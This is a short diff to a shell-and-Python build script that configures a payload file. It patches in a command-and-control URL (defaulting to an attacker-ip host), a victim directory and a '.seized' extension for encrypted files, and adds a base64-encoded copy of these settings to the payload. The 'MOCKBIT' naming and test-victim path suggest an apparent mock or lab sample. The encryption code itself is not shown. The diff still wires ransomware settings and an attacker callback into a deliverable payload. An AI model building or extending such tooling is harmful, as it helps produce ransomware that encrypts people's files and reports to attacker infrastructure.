@@ -40,6 +40,7 @@ cp "$PAYLOAD_SOURCE" "$PAYLOAD_TARGET"
 export C2_URL TARGET_DIR ENCRYPTED_EXT PAYLOAD_TARGET
 
 python3 - <<'PY'
+import base64
 import os
 from pathlib import Path
 
@@ -51,7 +52,16 @@ c2_value = shell_escape(os.environ['C2_URL'])
 target_dir_value = shell_escape(os.environ['TARGET_DIR'])
 ext_value = shell_escape(os.environ['ENCRYPTED_EXT'])
 
+env_lines = [
+    f'C2_URL={os.environ["C2_URL"]}',
+    f'TARGET_DIR={os.environ["TARGET_DIR"]}',
+    f'ENCRYPTED_EXT={os.environ["ENCRYPTED_EXT"]}',
+]
+embedded_env = "\n".join(env_lines) + "\n"
+embedded_b64 = base64.b64encode(embedded_env.encode()).decode()
+
 replacements = {
+    'MOCKBIT_EMBEDDED_ENV_B64="${MOCKBIT_EMBEDDED_ENV_B64:-}"': f'MOCKBIT_EMBEDDED_ENV_B64="{embedded_b64}"',
     'C2_URL="${C2_URL:-http://attacker-ip:8080}"': f'C2_URL="${{C2_URL:-{c2_value}}}"',
     'TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"': f'TARGET_DIR="${{TARGET_DIR:-{target_dir_value}}}"',
     'ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"': f'ENCRYPTED_EXT="${{ENCRYPTED_EXT:-{ext_value}}}"',
